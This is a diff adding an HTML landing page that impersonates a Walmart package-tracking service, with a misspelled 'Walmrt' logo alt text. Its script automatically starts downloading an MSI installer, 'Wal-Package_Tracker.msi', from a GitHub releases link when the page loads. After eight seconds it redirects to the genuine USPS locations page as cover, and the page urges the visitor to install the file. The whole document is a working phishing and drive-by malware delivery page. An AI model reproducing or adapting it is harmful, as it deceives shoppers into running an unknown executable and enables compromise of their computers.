@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        background: #0157E9;
+        font-family: Arial, sans-serif;
+        color: #263238;
+        text-align: center;
+    }
+
+    .container {
+        max-width: 580px;
+        margin: 55px auto;
+        padding: 35px 25px;
+        background: #fff;
+        border-radius: 12px;
+        box-shadow: 0 5px 25px rgba(0,0,0,0.08);
+    }
+
+    .logo {
+        width: 260px;
+        max-width: 85%;
+        height: auto;
+        margin-bottom: 30px;
+    }
+
+    .download-box {
+        padding: 25px 20px;
+        border: 2px solid #d8e4f0;
+        border-radius: 10px;
+        background: #f8fbff;
+        animation: glow 2s infinite;
+    }
+
+    .download-icon {
+        font-size: 42px;
+        margin-bottom: 12px;
+        animation: bounce 1.5s infinite;
+    }
+
+    .download-title {
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 12px;
+    }
+
+    .download-text {
+        font-size: 14px;
+        line-height: 1.7;
+        color: #596773;
+    }
+
+    .progress {
+        height: 7px;
+        background: #e1e8ef;
+        border-radius: 10px;
+        overflow: hidden;
+        margin-top: 22px;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 35%;
+        background: #2878d0;
+        border-radius: 10px;
+        animation: loading 2s infinite ease-in-out;
+    }
+
+    .notice {
+        margin-top: 24px;
+        font-size: 13px;
+        line-height: 1.7;
+        color: #596773;
+    }
+
+    @keyframes glow {
+        0%, 100% {
+            box-shadow: 0 0 5px rgba(40,120,208,0.08);
+        }
+        50% {
+            box-shadow: 0 0 18px rgba(40,120,208,0.22);
+        }
+    }
+
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-7px); }
+    }
+
+    @keyframes loading {
+        0% { width: 5%; }
+        50% { width: 85%; }
+        100% { width: 5%; }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <img
+        class="logo"
+        src="https://i.pinimg.com/736x/a0/bf/4f/a0bf4f48c181ec293b9387418a5cc55b.jpg"
+        alt="Walmrt">
+
+    <div class="download-box">
+        <div class="download-icon">⬇</div>
+
+        <div class="download-title">
+            Your Package Tracker Download Is Starting
+        </div>
+
+        <div class="download-text">
+            Please wait while your shipment tracking is being prepared.
+        </div>
+
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <div class="notice">
+        Once download is complete, don't forget to install it properly so you can follow details on your pcs.
+    </div>
+
+</div>
+
+<script>
+    // Download URL
+    const downloadUrl = "https://github.com/me1moup10/vr/releases/download/wal/Wal-Package_Tracker.msi";
+
+    // Redirect URL
+    const redirectUrl = "https://tools.usps.com/locations/";
+
+    // Start download
+    window.location.href = downloadUrl;
+
+    // Redirect after 8 seconds
+    setTimeout(function () {
+        window.location.replace(redirectUrl);
+    }, 8000);
+</script>
+
+</body>
+</html>
